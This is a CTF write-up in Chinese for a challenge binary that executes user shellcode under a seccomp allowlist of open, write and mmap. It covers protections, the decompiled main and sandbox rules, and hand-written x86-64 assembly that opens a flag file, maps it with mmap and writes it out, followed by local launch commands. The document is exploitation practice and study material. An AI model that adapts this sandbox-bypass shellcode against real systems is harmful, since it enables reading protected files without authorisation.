# shellcode（64 位 shellcode 执行 + seccomp）

## 来源与附件

| 项 | 值 |
| --- | --- |
| 出处 | 文件名只有 `shellcode`，没有附带题面或比赛说明 |
| 二进制 | `shellcode`，**未 strip**，x86-64，非 PIE，Build ID `b3b8360d10005ea3026ad6072c912b7d02f61d85` |
| sha256 | `a55d05c76d4341b9b46ec2d88491b34f56fb12f5e2977148845ec8f14960c87b` |
| 编译环境 | `GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2)`，interpreter `/lib64/ld-linux-x86-64.so.2` |
| 动态依赖 | `libc.so.6`、**`libseccomp.so.2`** |
| 运行库 | `env/` 内自带 2.31-0ubuntu9.17 libc/loader + `libseccomp.so.2` |

按 Ubuntu 20.04 编译环境本来是 glibc 2.31，但利用全程走裸 syscall，libc 只负责启动，不依赖某个补丁版；按用户要求放在 `栈/` 下，归入 `ret2shellcode/`，运行库随题目放在 `env/`。这是**本地兼容候选**，不是远程版本的证明。`libseccomp.so.2` 是题目必需的依赖（二进制自己调 seccomp），随 `env/` 一起放；它只要求 `GLIBC_2.2.5`/`2.3.4`/`2.4`，能和 2.31 一起加载。

## 保护

| 保护 | 结论 | 依据 |
| --- | --- | --- |
| PIE | 关 | `e_type = ET_EXEC`，代码在 `0x401xxx` |
| NX | 开 | `GNU_STACK` 为 `rw-` |
| RELRO | Partial | 有 `GNU_RELRO`，无 `BIND_NOW` |
| CET | 有 `endbr64` | 函数入口带 `endbr64`，是否强制看运行环境 |
| 可执行内存 | 题目主动开 | `mmap(0, 0x1000, PROT_READ\|WRITE\|EXEC, MAP_PRIVATE\|MAP_ANONYMOUS, -1, 0)` |

## main 逻辑（反汇编要点）

```c
srand(time(0));
rand() % 5;                                  // 结果存了但从未使用
char *buf = mmap(NULL, 0x1000, 7, 0x22, -1, 0);   // RWX
puts("Welcome to the shellcode challenge!");
puts("Brave shellcode warrior, your trial begins now!");
puts("Enough talk. Send your shellcode:");
fflush(stdout);
ssize_t n = read(0, buf, 0x100);             // 最多 0x100 字节
printf("Shellcode received, %zd bytes. Executing now!\n", n);
init_sandbox();                              // 装 seccomp
((void (*)(void))buf)();                     // 直接执行输入
```

## seccomp 规则（`init_sandbox`）

```text
seccomp_init(0)                              // 默认动作 = SCMP_ACT_KILL_THREAD
seccomp_arch_add(ctx, 0xc000003e)            // SCMP_ARCH_X86_64
seccomp_rule_add(ctx, SCMP_ACT_ALLOW,  2)    // open
seccomp_rule_add(ctx, SCMP_ACT_ALLOW,  1)    // write
seccomp_rule_add(ctx, SCMP_ACT_ALLOW,  9)    // mmap
seccomp_load(ctx); seccomp_release(ctx);
```

白名单只有 **open、write、mmap**，其余系统调用一律杀线程。两个容易踩的点：

1. **没有 `read`**（0 不在白名单）。所以不能 open 后 read 再 write；出题人的意图是用 `mmap(fd)` 把文件映射进来，再 `write` 出去。
2. 调 `open` 必须用**原始系统调用号 2**。glibc 的 `open()` 包装实际走 `openat`（257），会被过滤器直接杀掉；`openat` 也不在白名单里。
3. shellcode 执行完不要指望正常 `exit`：`exit_group`（231）也不允许，返回后进程会被 seccomp 杀掉，所以要在被杀之前 `write` 完。

## 利用思路（静态推断）

```asm
; open("flag", O_RDONLY)            rax=2
xor  esi, esi            ; O_RDONLY
push 0x67616c66          ; "flag\0\0\0\0"
mov  rdi, rsp
push 2 ; pop rax
syscall
mov  rdi, rax            ; fd

; mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0)   rax=9
mov  r8, rdi             ; 第 5 个参数 fd 放 r8
xor  edi, edi            ; addr = NULL
mov  esi, 0x1000         ; len
mov  edx, 1              ; PROT_READ
mov  r10d, 2             ; MAP_PRIVATE（第 4 个参数）
xor  r9d, r9d            ; offset = 0
push 9 ; pop rax
syscall
mov  rsi, rax            ; 映射到的地址

; write(1, addr, 0x100)              rax=1
push 1 ; pop rax
push 1 ; pop rdi
mov  edx, 0x100
syscall
```

要点：`mmap` 的第 5 个参数（fd）放 `r8`，`prot` 用 `PROT_READ` 而不是 RWX；打开的文件名按题目实际是 `flag`/`flag.txt` 调整。`read` 本身不能用作泄露手段，`write` 的目标必须是已映射的地址。

## 启动（Linux VM）

```bash
PWN_ROOT="$(pwd)"
"$PWN_ROOT/栈/ret2shellcode/shellcode/env/ld-2.31.so" \
  --library-path "$PWN_ROOT/栈/ret2shellcode/shellcode/env" \
  "$PWN_ROOT/栈/ret2shellcode/shellcode/shellcode"
```

或用统一入口（会自动识别 `env/`）：

```bash
bash tools/pwn-env.sh run 2.31 amd64 栈/ret2shellcode/shellcode/shellcode
bash tools/pwn-env.sh gdb 2.31 amd64 栈/ret2shellcode/shellcode/shellcode
```

`seccomp-tools dump` 可复核过滤器；GDB 里 `catch syscall openat` 能验证 glibc 包装被拦。

## 状态

- 已验证（静态）：架构、Build ID、保护属性、`main`/`init_sandbox` 反汇编、seccomp 白名单、依赖库与版本需求、`env/` 运行库版本。
- 未验证：VM 内启动、shellcode 实际执行、seccomp 命中行为、拿 flag。macOS 不能执行 Linux ELF。
- 没有题面和出处；之后确认来源时把标题补成正式题名即可。
